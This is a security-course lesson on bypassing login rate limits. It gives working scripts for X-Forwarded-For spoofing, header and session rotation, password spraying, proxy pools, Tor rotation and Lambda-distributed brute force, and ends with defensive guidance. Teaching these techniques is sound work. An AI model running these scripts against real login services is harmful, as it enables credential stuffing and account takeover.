---
title: "Rate Limiting Bypass for Auth Attacks — IP Rotation, User-Agent Cycling, Distributed Brute Force"
tags: [rate-limiting, bypass, IP-rotation, user-agent, distributed-brute-force,
       proxy-rotation, authentication, ATT&CK-T1110, CWE-307, credential-attack]
module: 04-BroadSurface-01
day: 167
related_topics:
  - Credential Stuffing and Spraying (Day 166)
  - API Rate Limiting and DoS (Day 153)
  - Credential Attack Lab (Day 168)
  - Auth Attack Detection (Day 176)
---

# Day 167 — Rate Limiting Bypass

> "Rate limiting is a promise the server makes to itself: 'I will not process
> more than N requests from this entity.' Every bypass exploits a gap in how
> the server defines 'entity.' Is it the IP? The header? The session? The
> username? Find the gap. That is where the spray goes through."
>
> — Ghost

---

## Goals

By the end of this lesson you will be able to:

1. Fingerprint a target's rate limiting mechanism and identify its key (IP,
   header, session, account).
2. Execute IP rotation bypass using `X-Forwarded-For` header spoofing and
   proxied requests.
3. Cycle user-agent strings and other headers to evade fingerprint-based
   detection.
4. Build a distributed brute-force setup using a proxy pool.
5. Identify rate limiting implementations that are bypass-resistant and
   explain why.

---

## Prerequisites

| Requirement | Reference |
|---|---|
| Rate limiting concepts (API context) | Day 153 |
| Credential stuffing / spraying mechanics | Day 166 |
| Burp Suite | Days 22–24 |
| Python requests library | Days 149, 152 |

---

## Part 1 — Fingerprinting the Rate Limiter

Before bypassing, identify exactly what mechanism is in place and what it is
keyed on. Different keys require different bypasses.

### 1.1 — Identify the Limit

Send requests until you hit a 429 or lockout. Note:
- How many requests triggered it?
- What is the time window? (Check `Retry-After`, `X-RateLimit-Reset`)
- Does the 429 say "too many requests" or does it say "account locked"?

```bash
# Baseline: how many requests before 429?
for i in $(seq 1 20); do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST https://target.com/login \
    -d "username=test@target.com&password=wrong${i}")
  echo "Attempt $i: $STATUS"
  [ "$STATUS" = "429" ] && echo "Rate limit hit at attempt $i" && break
done
```

### 1.2 — Identify the Key

Test each possible key:

```bash
# Test 1: Is it keyed on IP?
# Change nothing but add X-Forwarded-For
curl -X POST https://target.com/login \
  -H "X-Forwarded-For: 10.0.0.1" \
  -d "username=test@target.com&password=wrong"
# If 200/401 (not 429) → keyed on XFF IP

# Test 2: Is it keyed on account?
# Switch to a different username after hitting limit
curl -X POST https://target.com/login \
  -d "username=other@target.com&password=wrong"
# If 200/401 (not 429) → keyed on username/account

# Test 3: Is it keyed on session?
# Get a fresh session cookie
curl -c /tmp/new_cookies.txt https://target.com/login
curl -X POST https://target.com/login \
  -b /tmp/new_cookies.txt \
  -d "username=test@target.com&password=wrong"
# If bypass works → keyed on session token

# Test 4: Is it keyed on API key?
# Get a second API key (register second account)
# If different API key bypasses → keyed on API key
```

### 1.3 — Check Response Headers

```bash
curl -sv -X POST https://target.com/login \
  -d "username=test@target.com&password=wrong" 2>&1 \
  | grep -iE 'ratelimit|retry|x-|cf-|x-kong|x-nginx'
```

Header patterns by platform:

| Header | Platform |
|---|---|
| `X-RateLimit-*` | Flask-Limiter, FastAPI, custom |
| `RateLimit-*` | IETF draft standard |
| `Cf-Cache-Status` | Cloudflare |
| `X-Kong-Limit` | Kong Gateway |
| `Retry-After` | RFC 6585 compliant |

---

## Part 2 — Header-Based Bypasses

### 2.1 — X-Forwarded-For Rotation

Covered in Day 153 in the API context. For auth endpoints:

```python
import requests
import random
import time

def random_ip() -> str:
    return f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"

session = requests.Session()
login_url = "https://target.com/login"
combos = [("user1@target.com", "pass1"), ("user2@target.com", "pass2")]

for email, password in combos:
    headers = {
        "X-Forwarded-For": random_ip(),
        "X-Real-IP": random_ip(),
        "X-Originating-IP": random_ip(),
    }
    r = session.post(login_url,
                     data={"email": email, "password": password},
                     headers=headers, timeout=10)
    print(f"{email}: {r.status_code}")
    time.sleep(0.5)
```

### 2.2 — Full Header Rotation

Some defences fingerprint on multiple headers simultaneously. Rotate all of
them:

```python
import random

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
]

ACCEPT_LANGUAGES = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9,fr;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8",
    "fr-FR,fr;q=0.9",
]


def random_headers() -> dict:
    return {
        "User-Agent":      random.choice(USER_AGENTS),
        "Accept-Language": random.choice(ACCEPT_LANGUAGES),
        "X-Forwarded-For": random_ip(),
        "X-Request-ID":    f"{random.getrandbits(64):016x}",
    }
```

### 2.3 — Path Variation for Rate Limit Reset

Some limiters key on IP + exact path:

```python
paths = [
    "/login",
    "/login/",
    "/Login",
    "/login?_=1",
    "/login?_=2",
    "/api/v1/auth/login",
    "/api/v2/auth/login",    # test version confusion
]
```

Cycle through paths to get fresh rate limit windows for each.

---

## Part 3 — Session and Account Key Bypasses

### 3.1 — Session Cycling

If the rate limiter tracks per-session:

```bash
#!/bin/bash
# Create a fresh session before each attempt
CSRF=$(curl -sc /tmp/cookies_${i}.txt https://target.com/login \
  | grep -oP 'csrf_token.*?value="\K[^"]+')

curl -b /tmp/cookies_${i}.txt \
  -X POST https://target.com/login \
  -d "username=${user}&password=${pass}&csrf_token=${CSRF}"
```

### 3.2 — Account Key Bypass (Different Targets)

If the limiter blocks after N failures on a specific account, target a
different account for each request window:

```python
# Round-robin through a large username list
# Only make one attempt per account per window
from itertools import cycle

usernames = open("usernames.txt").read().splitlines()
passwords = ["Spring2024!", "Welcome1", "Company2024!"]

username_cycle = cycle(usernames)

for password in passwords:
    for username in usernames:
        r = attempt_login(username, password)
        time.sleep(10)  # 10 sec between attempts on any account
```

---

## Part 4 — Distributed Brute Force

When a single IP would be blocked regardless, distribute across multiple IPs.

### 4.1 — Proxy Pool with Residential Proxies

Residential proxy services (Bright Data, Smartproxy, Oxylabs) provide IPs from
real ISP customers. Requests originate from legitimate residential IPs that
blocklists do not flag.

```python
import requests
import random

PROXY_LIST = [
    "http://user:pass@proxy1.provider.com:8080",
    "http://user:pass@proxy2.provider.com:8080",
    # ... hundreds of residential IPs
]


def get_proxy() -> dict:
    proxy_url = random.choice(PROXY_LIST)
    return {"http": proxy_url, "https": proxy_url}


def attempt_with_proxy(email: str, password: str) -> int:
    try:
        r = requests.post(
            "https://target.com/login",
            data={"email": email, "password": password},
            proxies=get_proxy(),
            timeout=15,
        )
        return r.status_code
    except requests.RequestException:
        return 0
```

**Cost context:** residential proxies cost approximately $3–15/GB. A credential
stuffing campaign sending 1 KB per request against 100,000 accounts uses
~100 MB ≈ $1.50–7.50. This is why large-scale stuffing is economically viable
for attackers.

### 4.2 — Tor Exit Node Rotation

Free but slow. Each circuit change gives a new exit IP:

```bash
# Install and configure Tor
sudo apt install tor

# Rotate circuit with NEWNYM signal
function new_tor_circuit() {
  echo -e "AUTHENTICATE \"\"\nSIGNAL NEWNYM\nQUIT" \
    | nc 127.0.0.1 9051
  sleep 5  # Allow circuit to establish
}

# Send request through Tor
curl --socks5 127.0.0.1:9050 \
  -X POST https://target.com/login \
  -d "username=test&password=pass"

# Rotate and repeat
new_tor_circuit
```

**Limitation:** many organisations block Tor exit nodes at the firewall. Check
first: `curl --socks5 127.0.0.1:9050 https://target.com` — if it returns
a Cloudflare challenge or error, Tor is blocked.

### 4.3 — Cloud Function Distribution

Serverless functions (AWS Lambda, Cloudflare Workers, Vercel) each run from a
different IP. Use them to distribute requests:

```python
# Lambda function that makes one login attempt
# Deploy many instances with different configurations

import json
import urllib.request


def handler(event, context):
    data = json.dumps({
        "email": event["email"],
        "password": event["password"]
    }).encode()
    req = urllib.request.Request(
        "https://target.com/api/v1/auth/login",
        data=data,
        headers={"Content-Type": "application/json"}
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        return {"status": resp.status, "body": resp.read().decode()}
```

Invoke hundreds of Lambda functions simultaneously — each from a different AWS
IP. AWS assigns different egress IPs per invocation in many regions.

---

## Part 5 — Bypass-Resistant Rate Limiting

After seeing how bypasses work, understanding what a bypass-resistant
implementation looks like:

| Control | Bypassed by | Bypass-resistant alternative |
|---|---|---|
| IP-based limit | XFF spoofing / proxy rotation | Key on **authenticated identity** (user ID) |
| Session-based limit | New session per request | Bind limit to device fingerprint + IP |
| Header fingerprint | Rotate all headers | Browser challenge (CAPTCHA, JS proof-of-work) |
| Per-account limit | Round-robin accounts | Limit on **source IP** AND **account** independently |
| Path-exact limit | Path variation | Normalise path before keying |

**The most bypass-resistant auth rate limit:**

```
1. Per-IP: block after 100 failed attempts per hour (catches bulk stuffing)
2. Per-account: lock after 5 failures per 30 minutes (spray protection)
3. Per-phone/email device: require re-verification after unusual access pattern
4. Trusted proxy: only accept XFF from known load balancer IPs
5. CAPTCHA after first failure from unknown IP
6. Asynchronous processing with exponential delay
```

No single control is sufficient. Defence-in-depth is the answer.

---

## Key Takeaways

1. **Rate limiting is only as strong as its key.** A limiter keyed on IP is
   bypassed by IP rotation. Always test what the limiter is actually measuring.
2. **XFF spoofing is the cheapest bypass.** One header. Works against any
   IP-based limiter that trusts the forwarded IP unconditionally.
3. **Distributed attacks bypass per-source controls entirely.** The defence
   against distributed attacks is per-account controls, not per-IP controls.
4. **Residential proxies cost less than $10 for a full stuffing campaign.**
   This is why credential stuffing at scale is economically trivial for
   well-funded attackers.
5. **The most effective auth rate limiting combines per-IP AND per-account
   limits.** Either alone is insufficient.

---

## Exercises

1. On the Day 168 lab (upcoming), identify the rate limiting mechanism.
   What is it keyed on? What bypass applies?
2. Write a Python script that detects whether a login endpoint is rate-limited
   by IP, account, or session by sending systematic probes and comparing
   response patterns.
3. A company uses Cloudflare. Their rate limit blocks any IP after 50 failed
   logins in 10 minutes. Describe three bypass techniques that would still
   allow a spray campaign to proceed.
4. Write the Flask-Limiter configuration that implements bypass-resistant rate
   limiting: per-IP limit from trusted proxies only + per-account limit keyed
   on username from the request body.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q167.1, Q167.2 …).
> Follow-up questions use hierarchical numbering (Q167.1.1, Q167.1.2 …).

---

## Navigation

← Previous: [Day 166 — Credential Stuffing and Spraying](DAY-0166-Credential-Stuffing-and-Spraying.md)
→ Next: [Day 168 — Credential Attack Lab](DAY-0168-Credential-Attack-Lab.md)
